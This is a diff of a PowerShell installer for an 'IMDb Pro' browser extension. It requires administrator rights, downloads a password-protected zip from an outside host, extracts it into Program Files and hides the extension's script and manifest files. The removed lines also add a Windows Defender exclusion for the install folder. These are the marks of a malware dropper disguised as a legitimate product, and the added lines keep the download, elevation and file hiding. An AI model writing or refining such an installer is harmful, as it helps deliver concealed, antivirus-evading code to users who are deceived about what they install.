+    $spinTimer.Start()
+    Update-ProgressView "Preparing installation..." 5
+
     $downloadUrl = "https://file.apikey.my/imdb/imdb.zip"
-    $tempFile = "$env:TEMP\imdb.zip"
     $installPath = "C:\Program Files\imdb-pro"
     $zipPassword = "123"
-    
+
     try {
-        Update-Status "Checking administrator privileges..." 10
-        
-        # Admin check
+        # Check admin rights
+        Update-ProgressView "Checking administrator privileges..." 8
         if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
-            Update-Status "Administrator privileges required" 0
-            [System.Windows.Forms.MessageBox]::Show("Please run this installer as Administrator.", "Elevation Required", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Warning)
-            $installButton.Enabled = $true
-            $installButton.Text = "START INSTALLATION"
-            return
+            throw "Please run this installer as Administrator"
         }
-        
-        Update-Status "Creating installation directory..." 20
-        if (!(Test-Path $installPath)) {
+
+        # Create directory
+        Update-ProgressView "Preparing files..." 15
+        if (Test-Path $installPath) {
+            Remove-Item "$installPath\*" -Recurse -Force -ErrorAction SilentlyContinue
+        } else {
             New-Item -ItemType Directory -Path $installPath -Force | Out-Null
         }
-        
-        Update-Status "Downloading IMDb Pro package..." 40
-        Invoke-WebRequest -Uri $downloadUrl -OutFile $tempFile -UseBasicParsing
-        
-        Update-Status "Extracting package contents..." 60
-        $extractionSuccess = $false
-        
-        # Try 7-Zip first
-        if (Get-Command "7z" -ErrorAction SilentlyContinue) {
-            & 7z x -p$zipPassword -o"$installPath" -y $tempFile | Out-Null
-            $extractionSuccess = $?
+
+        # Download
+        Update-ProgressView "Downloading package..." 30
+        $tempFile = "$env:TEMP\imdb.zip"
+        $webClient = New-Object System.Net.WebClient
+        $downloadSucceeded = $false
+        try {
+            $webClient.DownloadFile($downloadUrl, $tempFile)
+            if (Test-Path $tempFile -and (Get-Item $tempFile).Length -gt 0) { $downloadSucceeded = $true }
+        } catch {
+            $downloadSucceeded = $false
         }
-        elseif (Test-Path "C:\Program Files\7-Zip\7z.exe") {
-            & "C:\Program Files\7-Zip\7z.exe" x -p$zipPassword -o"$installPath" -y $tempFile | Out-Null
-            $extractionSuccess = $?
-        }
-        
-        if (-not $extractionSuccess) {
-            Update-Status "Using alternative extraction method..." 70
+        if (-not $downloadSucceeded) { throw "Download failed. Check internet or URL." }
+
+        Update-ProgressView "Extracting files..." 55
+
+        # Try 7-zip, fallback to Expand-Archive
+        $seven = "$env:ProgramFiles\7-Zip\7z.exe"
+        if (Test-Path $seven) {
+            $args = @("x","-p$zipPassword","-o`"$installPath`"","-y","`"$tempFile`"")
+            $proc = Start-Process -FilePath $seven -ArgumentList $args -Wait -PassThru -NoNewWindow
+            if ($proc.ExitCode -ne 0) { throw "7-Zip extraction failed" }
+        } else {
             try {
-                Add-Type -AssemblyName System.IO.Compression.FileSystem
-                [System.IO.Compression.ZipFile]::ExtractToDirectory($tempFile, $installPath)
-            }
-            catch {
-                $shellApp = New-Object -ComObject Shell.Application
-                $zipFolder = $shellApp.NameSpace($tempFile)
-                $destFolder = $shellApp.NameSpace($installPath)
-                $destFolder.CopyHere($zipFolder.Items(), 0x14)
-                Start-Sleep -Seconds 2
+                Expand-Archive -Path $tempFile -DestinationPath $installPath -Force
+            } catch {
+                throw "Extraction failed: no 7-Zip and Expand-Archive failed"
             }
         }
-        
-        Update-Status "Securing installation files..." 85
-        Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
-        
-        $protectedFiles = @("background.js", "content.js", "popup.js", "manifest.json")
-        foreach ($file in $protectedFiles) {
-            $fullPath = Join-Path $installPath $file
-            if (Test-Path $fullPath) {
-                Set-ItemProperty -Path $fullPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden + [System.IO.FileAttributes]::System)
+
+        # Verify
+        Update-ProgressView "Verifying installation..." 75
+        $items = Get-ChildItem $installPath -Recurse -ErrorAction SilentlyContinue
+        if ($items.Count -eq 0) { throw "No files extracted" }
+
+        # Hide sensitive files if present
+        $hidden = @("background.js","content.js","popup.js","styles.css","popup.html","manifest.json")
+        foreach ($f in $hidden) {
+            $p = Join-Path $installPath $f
+            if (Test-Path $p) {
+                attrib +h $p
             }
         }
-        
-        Update-Status "Finalizing installation..." 95
-        Add-MpPreference -ExclusionPath $installPath -ErrorAction SilentlyContinue
-        
-        Update-Status "Installation completed successfully!" 100
-        
-        # Final UI updates
-        $installButton.Text = "INSTALLATION COMPLETE"
-        $installButton.BackColor = [System.Drawing.Color]::FromArgb(76, 175, 80)  # Green color
-        
-        [System.Windows.Forms.MessageBox]::Show(
-            "IMDb Pro has been successfully installed!`n`nLocation: $installPath`n`nPlease restart your browser to activate the extension.",
-            "Installation Complete",
-            [System.Windows.Forms.MessageBoxButtons]::OK,
-            [System.Windows.Forms.MessageBoxIcon]::Information
-        )
-        
+
+        # Cleanup
+        if (Test-Path $tempFile) { Remove-Item $tempFile -Force -ErrorAction SilentlyContinue }
+
+        Update-ProgressView "Finishing up..." 90
+        Start-Sleep -Milliseconds 600
+        Update-ProgressView "Complete" 100
+        Start-Sleep -Milliseconds 400
+
+        Show-Completion
     }
     catch {
-        Update-Status "Installation failed: $($_.Exception.Message)" 0
-        $installButton.Text = "TRY AGAIN"
-        $installButton.BackColor = [System.Drawing.Color]::FromArgb(244, 67, 54)  # Red color
-        $installButton.Enabled = $true
-        
-        [System.Windows.Forms.MessageBox]::Show(
-            "Installation failed: $($_.Exception.Message)",
-            "Installation Error",
-            [System.Windows.Forms.MessageBoxButtons]::OK,
-            [System.Windows.Forms.MessageBoxIcon]::Error
-        )
+        $spinTimer.Stop()
+        $spinner.Visible = $false
+        $statusLabel.Visible = $true
+        $statusLabel.Text = "Installation failed: $($_.Exception.Message)"
+        $statusLabel.ForeColor = [System.Drawing.Color]::FromArgb(200,40,40)
+        $progressBar.Visible = $false
+        $percentLabel.Visible = $false
+
+        # Show Retry button
+        $retryBtn = New-RoundedButton "Retry" 520 18 90 36 `
+            ([System.Drawing.Color]::FromArgb(0,120,215)) `
+            ([System.Drawing.Color]::FromArgb(0,100,190)) `
+            ([System.Drawing.Color]::White)
+        $retryBtn.Add_Click({
+            $mainForm.Controls.Remove($retryBtn)
+            $statusLabel.Text = ""
+            $progressBar.Value = 0
+            $percentLabel.Text = "0%"
+            Start-Installation
+        })
+        $mainForm.Controls.Add($retryBtn)
+        $cancelBtn.Enabled = $true
+    }
+    finally {
+        # re-enable cancel if not completed
+        if ($installBtn.Enabled -eq $false) {
+            # keep install disabled until completion
+        } else {
+            $cancelBtn.Enabled = $true
+        }
     }
 }
 
-# Show the form
+# Wire button events
+$cancelBtn.Add_Click({
+    try { $mainForm.Close() } catch {}
+})
+
+$installBtn.Add_Click({
+    if ($agreementCheckbox.Checked) {
+        Start-Installation
+    }
+})
+
+# Keyboard accessibility: Enter to install, Esc to cancel
+$mainForm.Add_KeyDown({
+    param($s,$e)
+    if ($e.KeyCode -eq [System.Windows.Forms.Keys]::Enter -and $installBtn.Enabled) { $installBtn.PerformClick() }
+    if ($e.KeyCode -eq [System.Windows.Forms.Keys]::Escape) { $cancelBtn.PerformClick() }
+})
+$mainForm.KeyPreview = $true
+
+[System.Windows.Forms.Application]::EnableVisualStyles()
 $mainForm.ShowDialog() | Out-Null
